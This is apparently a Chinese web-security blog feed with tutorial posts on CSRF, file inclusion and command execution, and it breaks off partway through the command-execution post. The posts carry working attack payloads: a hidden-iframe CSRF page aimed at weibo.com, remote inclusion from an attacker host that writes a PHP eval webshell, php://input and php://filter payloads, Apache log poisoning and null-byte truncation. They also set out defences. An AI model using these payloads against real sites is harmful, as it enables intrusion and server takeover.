punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要受害者打开post.html,就会自动提交post数据<br>缺点:url会跳转，会引起注意<br>改进代码:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>自动加载url<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myiframe<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.weibo.com/publish<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myiframe<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>listenid<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>666<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> form<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"form"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>优点:url不会跳转，不会引起注意</p></li></ul><h2 id="CSRF攻击的前提"><a href="#CSRF攻击的前提" class="headerlink" title="CSRF攻击的前提"></a>CSRF攻击的前提</h2><p>用户处于登陆状态</p><h2 id="CSRF测试中需要注意的问题"><a href="#CSRF测试中需要注意的问题" class="headerlink" title="CSRF测试中需要注意的问题"></a>CSRF测试中需要注意的问题</h2><p>在CSRF测试时，一定要考虑浏览器问题，每个浏览器的cookie机制都不完全相同。有的浏览器会发送cookie,有的浏览器则不会发送cookie.</p><h2 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h2><h3 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h3><ul><li>检测前确定web应用程序有哪些功能以及哪些功能的操作是敏感的，如：转账，修改密码等</li><li>拦截功能操作所对应的HTTP请求，分析请求中的关键参数</li><li>在本地生成POC文件，然后执行，看服务器有没有执行POC中的请求。如果已执行，则代表存在CSRF漏洞</li></ul><h3 id="半自动检测"><a href="#半自动检测" class="headerlink" title="半自动检测"></a>半自动检测</h3><p>半自动检测工具:CSRFTester<br>下载地址:<a href="https://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project">https://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project</a></p><h2 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h2><h3 id="二次确认"><a href="#二次确认" class="headerlink" title="二次确认"></a>二次确认</h3><p>在敏感操作时进行二次验证，如:弹出确认提示框，输入二次密码，输入验证码等</p><h3 id="Token认证-业内防御CSRF攻击的一致做法"><a href="#Token认证-业内防御CSRF攻击的一致做法" class="headerlink" title="Token认证(业内防御CSRF攻击的一致做法)"></a>Token认证(业内防御CSRF攻击的一致做法)</h3><p>token:标志，记号，令牌<br>token类似于验证码，但这种验证码不需要输入</p><h4 id="token认证原理"><a href="#token认证原理" class="headerlink" title="token认证原理"></a>token认证原理</h4><p>当用户登陆web应用后，服务器端会随机产生一段字符串分配给此用户，并且存储在session中。当用户进入某些页面时，直接传递在用户界面或者cookie中。</p><ul><li><p>在HTML表单中，为了用户体验更好，一般会隐藏起来，如:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.example.com/publish<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>hidden</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>12ewe8332e32u<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当用户进行提交表单操作时，这段token代码也会随之被提交。当服务器端接收到数据时，就会判断提交的这段token值是否与session中存储的字符串一致。如果一致，则认为是合法的请求；如果不一致，则有可能是CSRF攻击。</p></li><li><p>不需要提交表单的操作<br>通常会在cookie中存储token</p></li></ul><h4 id="使用token防御CSRF的详细步骤"><a href="#使用token防御CSRF的详细步骤" class="headerlink" title="使用token防御CSRF的详细步骤"></a>使用token防御CSRF的详细步骤</h4><ul><li>每当用户登陆后会随即生成一串字符串，并且存储在session中</li><li>分情况<ul><li>如果是post提交表单<br>  在敏感操作中加入隐藏标签，value即为session中保存的字符串  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>28e922bhddu<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>如果是get请求，则考虑在cookie中存储token</li></ul></li><li>提交请求后，服务器端取出session中的字符串与提交的token对比。如果一致，则认为是正常请求，否则认为可能是CSRF攻击</li><li>更新token值</li></ul><h4 id="token防御CSRF注意点"><a href="#token防御CSRF注意点" class="headerlink" title="token防御CSRF注意点"></a>token防御CSRF注意点</h4><p>当网站同时存在XSS与CSRF漏洞时，token防御机制将会失效。因为攻击者可以通过javascript获取token值<br>所以在防范CSRF时，首先需要确定网站是否存在XSS漏洞。如果存在XSS漏洞，那么防范CSRF是没有任何意义的</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件包含漏洞出现的可能"><a href="#文件包含漏洞出现的可能" class="headerlink" title="文件包含漏洞出现的可能"></a>文件包含漏洞出现的可能</h2><p>在PHP应用中居多（主要因为PHP语言提供的文件包含功能更强大更灵活)，在ASP，ASP.NET,JSP中出现的非常少</p><h2 id="包含漏洞原理"><a href="#包含漏洞原理" class="headerlink" title="包含漏洞原理"></a>包含漏洞原理</h2><h3 id="php包含"><a href="#php包含" class="headerlink" title="php包含"></a>php包含</h3><h4 id="php中文件包含的函数与区别"><a href="#php中文件包含的函数与区别" class="headerlink" title="php中文件包含的函数与区别"></a>php中文件包含的函数与区别</h4><ul><li>include() 找不到被包含的文件时只会产生警告(E_WARNING),脚本将继续执行</li><li>include_once() 与include()类似，唯一区别是如果该文件中的代码已经被包含则不会再次包含</li><li>require() 找不到被包含的文件时就会产生致命错误(E_COMPILE_ERROR),并停止脚本</li><li>require_once() 与require()类似，唯一区别是如果该文件中的代码已经被包含则不会再次包含</li></ul><h4 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h4><ul><li>本地包含（Local File Include,LFI)对本地文件进行包含<br>举例：(1)存在phpinfo.txt,文件内容是php代码：<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>(2)index.php文件包含phpinfo.txt:<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phpinfo.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>(3)访问index.php，phpinfo.txt被成功解析<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/phpinfo.png" class="">注：当被包含的文件内容符合php语法规范，不论文件后缀名是什么，都可以被php解析;<br>当被包含的文件内容不符合php语法规范，则会暴露该文件的源代码</li><li>远程包含（Remote File Include,RFI)对远程文件进行包含<br>远程包含的前提：php开启远程包含功能选项（php默认关闭）<br>php开启远程包含功能选项：(1)打开php.ini文件（2）将allow_url_include &#x3D; Off的Off改为On(3)重启web容器服务使其生效<br>举例：(1)<a href="http://www.hack.com根目录下存在phpinfo.txt文件：">http://www.hack.com根目录下存在phpinfo.txt文件：</a><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>(2)index.php文件：<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>(3)访问URL:<a href="http://www.xsser.com/index.php?page=http://www.hack.com/phpinfo.txt,phpinfo.txt%E8%A2%AB%E6%88%90%E5%8A%9F%E8%A7%A3%E6%9E%90">http://www.xsser.com/index.php?page=http://www.hack.com/phpinfo.txt,phpinfo.txt被成功解析</a><img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/php.png" class="">注：远程包含与本地包含没有区别，无论是哪种扩展名，只要被包含文件符合php语法规范，php解析器就会对其解析;<br>如果被包含的文件在服务器端不存在，则会显示警告信息，暴露出网站的绝对路径:<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/path.png" class=""></li></ul><h4 id="php文件包含利用"><a href="#php文件包含利用" class="headerlink" title="php文件包含利用"></a>php文件包含利用</h4><ul><li><p>读取敏感文件<br>访问URL:<a href="http://www.example.com/index.php?page=/etc/passwd">http://www.example.com/index.php?page=/etc/passwd</a><br>如果目标主机上存在该文件，并且有相应的权限，就可以读取文件的内容；<br>如果目标主机上存在该文件，但没有相应的权限，则会显示警告：</p><img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/restriction.png" class=""><ul><li>常见的敏感信息路径<ul><li>windows系统  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/windows.png" class=""></li><li>unix&#x2F;linux系统  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/linux.png" class=""></li></ul></li></ul></li><li><p>远程包含shell<br>前提：allow_url_fopen &#x3D; On<br>c&amp;c服务器端(<a href="http://www.hack.com)存在恶意文件echo.txt,文件内容为：">http://www.hack.com)存在恶意文件echo.txt,文件内容为：</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span>xss<span class="token punctuation">]</span></span>);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问URL:<a href="http://www.example.com/index.php?page=http://www.hack.com/echo.txt">http://www.example.com/index.php?page=http://www.hack.com/echo.txt</a>,<br>则会在index.php所在的目录下生成shell.php,内容为一句话木马<code>&lt;?php eval($_POST[xss]);?&gt;</code></p></li><li><p>本地包含配合文件上传<br>目标网站有上传文件功能，我们利用此功能向目标网站上传一个文件(如：一句话木马图片),上传路径为.&#x2F;6.jpg:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span>xss<span class="token punctuation">]</span></span>);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问URL:<a href="http://www.example.com/index.php?page=./6.jpg">http://www.example.com/index.php?page=./6.jpg</a>,<br>则会在index.php所在目录下生成shell.php,内容为一句话木马<code>&lt;?php eval($_POST[xss]);?&gt;</code></p></li><li><p>使用php封装协议<br>php带有很多内置URL风格的封装协议，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似<br>常见的php内置协议</p><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;#访问本地文件系统http:&#x2F;&#x2F;#访问HTTP(s)网址ftp:&#x2F;&#x2F;#访问FTP(s)URLsphp:&#x2F;&#x2F;#访问输入&#x2F;输出流(I&#x2F;O streams)zlib:&#x2F;&#x2F;#压缩流data:&#x2F;&#x2F;#数据(RFC 2397)ssh2:&#x2F;&#x2F;#Secure Shell 2expect:&#x2F;&#x2F;#处理交互式的流glob:&#x2F;&#x2F;#查找匹配的文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更多请参考：<a href="http://php.net/manual/zh/wrappers.php">http://php.net/manual/zh/wrappers.php</a></p><ul><li>使用封装协议读取php文件<br>  访问URL:<a href="http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php">http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</a><br>  得到经过base64加密后的字符串,通过解密就可以得到原字符串</li><li>写入php文件<br>  使用php:&#x2F;&#x2F;input可以执行php语句<br>  php:&#x2F;&#x2F;input使用的前提:allow_url_include &#x3D; On<br>  访问URL:<a href="http://www.example.com/index.php?page=php://input">http://www.example.com/index.php?page=php://input</a> ,并且提交的数据为php语句，如： <code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;xss&#39;]);?&gt;&quot;);?&gt;</code><br>  则该php语句就会执行,就会在index.php所在目录生成shell.php文件<br>  例：<img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/input.png" class=""></li></ul></li><li><p>包含apache日志文件<br>注：当目标存在本地文件包含漏洞却无法上传文件时，我们就无法生成webshell。这时，我们就可以通过找到apache路径，利用本地文件包含漏洞包含apache日志文件来获取webshell<br>apache运行后一般默认会生成两个日志文件：access.log(访问日志),error.log(错误日志)<br>access.log:记录了客户端的每次请求及服务器响应的相关信息</p><img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/access_log.png" class=""><p>每一行记录一次网站访问记录，由7部分组成，格式如下:<br><code>客户端地址 访问者的标识 访问者的验证名字 请求的时间 请求类型 响应的HTTP状态码 发送给客户端的字节数</code></p><pre class="line-numbers language-none"><code class="language-none">客户端地址：访问网站的客户端ip地址访问者的标识：该项一般为空白，用“-”替代访问者的验证名字：用于记录访问者身份验证时提供的名字。该项一般为空白请求的时间：记录访问操作的发生时间请求类型：记录了服务器收到的是什么类型的请求(GET,POST,HEAD等)响应的HTTP状态码：通过该项可以判断请求是否成功，一般为200发送给客户端的字节数：表示服务器发送给客户端的总字节数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>利用方法：<br>  当访问一个不存在的资源时，apache日志同样会记录。因此在网站存在本地文件包含漏洞但却没有可包含的网页木马文件时就可以访问URL: <code>http://www.example.com/&lt;?php phpinfo();?&gt;</code> ,apache会记录请求<code>&lt;?php phpinfo();?&gt;</code>并写入到access.log文件中，此时我们就可以包含access.log文件，就可以成功利用本地文件包含漏洞。<br>  注：使用浏览器访问URL:<code>http://www.example.com/&lt;?php phpinfo();?&gt;</code>,浏览器会对php语句中的<code>&lt;</code>,<code>空格</code>,<code>&gt;</code>进行转码，因此写入apache日志的php语句就会变成<code>%3C?php%20phpinfo();%20?%3E</code>,这样就无法利用apache包含漏洞，我们可以使用burp来绕过编码：<ul><li>绕过前<br>  apache日志  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E7%BB%95%E8%BF%87%E5%89%8D.png" class="">  burp  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/burp%E7%BB%95%E8%BF%87%E5%89%8D.png" class=""></li><li>绕过后<br>  apache日志  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E7%BB%95%E8%BF%87%E5%90%8E.png" class="">  burp  <img src="/2022/02/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/burp%E7%BB%95%E8%BF%87%E5%90%8E.png" class=""></li></ul></li></ul><p>  注：在使用本地包含漏洞包含apache日志时，必须知道apache日志的路径，否则无法利用；<br>  安全建议：apache的路径是重点，所以在安装apache时尽量不要使用默认路径</p></li><li><p>截断包含<br>程序员以为的文件包含漏洞修复代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"home.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码是程序员想以固定扩展名来修复文件包含漏洞:当我们访问URL:<code>http://www.example.com/index.php?page=echo.txt</code>时，要包含的文件就变成了<code>echo.txt.php</code>,这样的文件并不存在，从而无法正常利用文件包含漏洞</p><ul><li>使用截断的方法来绕过防护<br>  访问URL:<code>http://www.example.com/index.php?page=echo.txt%00</code><br>  使用前提：magic_quotes_gpc &#x3D; Off (如果magic_quotes_gpc &#x3D; On,%00(NULL)就会被转义，就无法起到截断的作用)<ul><li>magic_quotes_gpc &#x3D; On时会对以下预定义字符转义：  <pre class="line-numbers language-none"><code class="language-none">&#39; (单引号)&quot; (双引号)\ (反斜杠)NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>  拓展：php老版本中也存在其他一些截断问题，不过现在已经很难见到了。如：<br>  <code>index.php?page=echo.txt./././././././././././...</code> #使用一定数量的<code>./</code>来截断</li></ul></li></ul></li><li><p>绕过WAF防火墙<br>文件包含漏洞有时被用来制作后门，来躲避web杀毒软件的检测。如:包含一句话木马图片</p></li></ul><h3 id="JSP包含"><a href="#JSP包含" class="headerlink" title="JSP包含"></a>JSP包含</h3><p>JSP包含分为：静态包含，动态包含</p><h4 id="静态包含"><a href="#静态包含" class="headerlink" title="静态包含"></a>静态包含</h4><p>语法:<code>&lt;%@ include file=&quot;被包含的文件&quot; %&gt;</code><br>原理：先进行包含，再做处理操作(编译)。不能包含一个动态页面(变量)<br>例：被包含的文件6.txt,文件内容为:</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page language&#x3D;&quot;java&quot; pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;&lt;%out.println(&quot;hello&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>用index.jsp包含6.txt:</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ include file&#x3D;&quot;6.txt&quot; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用浏览器访问index.jsp，6.txt会被当成jsp文件解析<br>注：JSP语法规定：include指令为静态包含，只允许包含一个已经存在于服务器中的文件，而不能使用变量来控制包含某个文件。这就意味着使用include指令将不存在文件包含漏洞</p><h4 id="动态包含"><a href="#动态包含" class="headerlink" title="动态包含"></a>动态包含</h4><p>语法:<code>&lt;jsp:include page=&quot;被包含的文件&quot; /&gt;</code><br>原理:先处理被包含文件(编译),然后再包含。可以包含一个动态页面(变量)<br>例：被包含的文件6.txt,文件内容为：</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%String pages &#x3D; request.getParameter(&quot;page&quot;);%&gt;&lt;jsp:include page&#x3D;&quot;&lt;%&#x3D;pages%&gt;&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>用浏览器访问index.jsp,6.txt未被当成jsp文件解析<br>注：当<code>&lt;jsp:include/&gt;</code>标签在包含一个非jsp文件扩展名时，即使文件内容为JSP代码，也不会以JSP来解析，只会暴露其源代码。这就意味着即使攻击者能够控制JSP所包含的页面(页面通常为非jsp扩展名，因为jsp文件一般不让上传),得到的信息也是有限的。所以攻击者一般包含一些web容器的配置文件，如:tomcat的user.xml</p><h2 id="安全编写包含"><a href="#安全编写包含" class="headerlink" title="安全编写包含"></a>安全编写包含</h2><p>造成文件包含漏洞的根本原因:被包含的页面可以被攻击者所控制(攻击者可以随心所欲的去包含某个页面)</p><h3 id="防御文件包含漏洞的措施"><a href="#防御文件包含漏洞的措施" class="headerlink" title="防御文件包含漏洞的措施"></a>防御文件包含漏洞的措施</h3><ul><li>严格判断包含中的参数是否外部可控</li><li>路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：<code>../</code></li><li>包含文件验证：验证被包含的文件是否是白名单中的一员</li><li>尽量不要使用动态包含，可以在需要包含的页面固定写好，如:<code>include(&quot;head.php&quot;)</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞</title>
      <link href="/2021/12/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/12/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>命令执行漏洞是指攻击者可以随意执行系统命令。<br>它属于高危漏洞，也属于代码执行的范畴</p><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><ul><li>&amp;</li><li>&amp;&amp;</li><li>|</li><li>||</li></ul><h2 id="命令执行漏洞和代码执行漏洞的区别"><a href="#命令执行漏洞和代码执行漏洞的区别" class="headerlink" title="命令执行漏洞和代码执行漏洞的区别"></a>命令执行漏洞和代码执行漏洞的区别</h2><p>命令执行漏洞是直接调用操作系统命令<br>代码执行漏洞是靠执行脚本代码调用操作系统命令</p><h2 id="命令执行模型"><a href="#命令执行模型" class="headerlink" title="命令执行模型"></a>命令执行模型</h2><p>任何脚本语言都可以调用操作系统命令</p><h3 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h3><p>PHP提供了部分函数用来执行外部应用程序</p><ul><li><p>例：</p><pre class="line-numbers language-none"><code class="language-none">  system()shell_exec()exec()passthru()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>命令执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" 